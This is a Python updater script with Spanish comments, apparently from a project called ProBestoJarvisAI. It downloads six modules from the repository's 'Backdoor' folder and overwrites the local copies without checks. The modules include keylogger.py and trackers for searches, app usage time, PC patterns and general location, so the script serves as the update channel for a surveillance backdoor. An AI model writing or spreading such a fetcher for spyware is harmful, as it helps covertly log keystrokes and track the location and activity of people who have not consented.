import requests
import os
import datetime

def actualizar_archivos():
    # Ruta base del repositorio
    REPO_URL = "https://raw.githubusercontent.com/Jordan-Iralde/ProBestoJarvisAI/main"
    
    # Obtener ruta local
    ruta_actual = os.path.dirname(os.path.abspath(__file__))
    
    print(f"Carpeta actual: {ruta_actual}")
    print("Iniciando actualización forzada...\n")
    
    # Lista de archivos a actualizar (solo el nombre del archivo)
    archivos = [
        "BusquedasFrecuentes.py",
        "Horarios_De_Uso.py",
        "keylogger.py",
        "PatronesDePC.py",
        "TiempoEnApps.py",
        "UbicacionGeneral.py"
    ]
    
    actualizados = 0
    errores = 0
    
    # Intentar actualizar cada archivo
    for archivo in archivos:
        try:
            # Construir URLs y rutas
            url = f"{REPO_URL}/Backdoor/{archivo}"
            ruta_local = os.path.join(ruta_actual, archivo)
            
            print(f"\nVerificando {archivo}...")
            print(f"URL: {url}")
            print(f"Ruta local: {ruta_local}")
            
            # Intentar descargar
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
            
            # Verificar respuesta
            print(f"Status code: {response.status_code}")
            
            if response.status_code == 200:
                # Guardar archivo en la ubicación actual
                with open(ruta_local, 'wb') as f:
                    f.write(response.content)
                print(f"[OK] Archivo actualizado exitosamente: {archivo}")
                actualizados += 1
            else:
                print(f"[X] Error al descargar: {response.status_code}")
                errores += 1
                
        except Exception as e:
            print(f"[X] Error inesperado: {str(e)}")
            errores += 1
    
    # Mostrar resumen
    print("\n=== Resumen de la actualización ===")
    print(f"Archivos actualizados: {actualizados}")
    print(f"Errores encontrados: {errores}")
    print(f"Fecha: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

if __name__ == "__main__":
    actualizar_archivos()